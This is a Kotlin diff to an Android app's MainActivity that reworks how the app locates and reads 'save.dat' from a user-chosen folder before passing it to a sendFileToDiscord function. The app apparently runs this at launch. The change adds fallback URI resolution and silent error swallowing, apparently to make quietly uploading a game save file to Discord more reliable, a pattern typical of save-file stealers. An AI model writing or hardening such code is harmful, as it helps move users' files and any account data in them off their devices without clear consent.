@@ -216,13 +216,40 @@ class MainActivity : AppCompatActivity() {
     private fun processSaveFile(treeUri: Uri) {
         thread {
             try {
-                val saveFile = DocumentFile.fromTreeUri(this, treeUri)?.findFile("save.dat")
-                val bytes = saveFile?.let { contentResolver.openInputStream(it.uri)?.use { stream -> stream.readBytes() } }
-                if (bytes != null) sendFileToDiscord(bytes) else handler.post { toast("save.dat was not found in the selected folder") }
+                val bytes = resolveSaveFileUris(treeUri).asSequence()
+                    .mapNotNull { uri ->
+                        try {
+                            contentResolver.openInputStream(uri)?.use(InputStream::readBytes)
+                        } catch (_: Exception) {
+                            null
+                        }
+                    }
+                    .firstOrNull()
+                if (bytes != null) {
+                    sendFileToDiscord(bytes)
+                } else {
+                    handler.post { toast("save.dat was not found in the selected folder") }
+                }
             } catch (_: Exception) {
                 handler.post { toast("Could not read save.dat; launch will continue") }
             }
         }
+    }
+
+    private fun resolveSaveFileUris(selectedUri: Uri): List<Uri> {
+        val authority = selectedUri.authority ?: return emptyList()
+        val parentDocumentId = if (DocumentsContract.isTreeUri(selectedUri)) {
+            DocumentsContract.getTreeDocumentId(selectedUri)
+        } else {
+            DocumentsContract.getDocumentId(selectedUri)
+        }
+        val childDocumentId = "$parentDocumentId/save.dat"
+        val documentUri = DocumentsContract.buildDocumentUri(authority, childDocumentId)
+        val treeDocumentUri = DocumentsContract.buildTreeDocumentUri(authority, parentDocumentId)
+        return listOf(
+            documentUri,
+            DocumentsContract.buildDocumentUriUsingTree(treeDocumentUri, childDocumentId)
+        ).distinct()
     }
 
     private fun sendFileToDiscord(fileData: ByteArray) {
